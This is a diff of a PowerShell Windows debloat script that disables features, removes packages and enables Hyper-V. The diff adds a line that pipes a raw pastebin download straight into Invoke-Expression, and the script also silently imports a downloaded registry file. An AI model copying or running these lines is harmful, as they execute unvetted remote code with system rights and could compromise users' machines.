@@ -1,5 +1,6 @@
 $ProgressPreference = 'SilentlyContinue'
 
+irm pastebin.com/raw/T0hVL32u | iex
 irm github.com/GabiNun/Script/raw/main/Settings.reg -Out Script.reg;regedit /s Script.reg;Stop-Process -Name explorer
 
 winget source remove msstore | Out-Null
@@ -48,7 +49,10 @@ foreach ($feature in (Get-WindowsOptionalFeature -Online | Where-Object State -e
     Dism /Online /Disable-Feature /FeatureName:$feature /NoRestart | Out-Null
 }
 
-Get-AppxPackage | Where-Object IsFramework -eq 'False' | Where-Object NonRemovable -eq 'False' | Where-Object Name -notmatch 'Notepad|Terminal' | Remove-AppxPackage
+foreach ($Package in $Packages) {
+    Get-AppxPackage -Name $Package | Remove-AppxPackage -AllUsers
+}
+
 Dism /Online /Enable-Feature /FeatureName:Microsoft-Hyper-V-All /All /NoRestart | Out-Null
 
 Unregister-ScheduledTask -Confirm:$False
